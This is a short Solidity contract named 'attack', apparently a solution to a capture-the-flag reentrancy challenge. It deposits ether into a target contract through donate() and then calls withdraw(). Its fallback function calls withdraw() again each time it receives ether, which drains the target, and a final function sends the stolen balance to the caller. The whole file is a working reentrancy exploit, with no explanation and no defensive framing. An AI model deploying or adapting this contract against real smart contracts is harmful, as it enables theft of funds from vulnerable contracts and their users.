// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack {

    address payable target;
    address payable public owner;
    uint amount = 1000000000000000 wei;

    constructor(address payable _addr) public payable {
        target=_addr;

    }

    function step1() public payable{
        bool b;
        (b,)=target.call{value: amount,gas:1000000000}(abi.encodeWithSignature("donate(address)",address(this)));
        require(b,"step1 error");
    }

    function setp2() public payable {
        bool b;
        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));
        require(b,"step2 error");
    }


    fallback () external payable{
        bool b;
        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));
        require(b,"fallback error");
    }
    function mywithdraw() external payable {
    payable(msg.sender).transfer(address(this).balance); // 将 msg.sender 转换为 payable
    }

}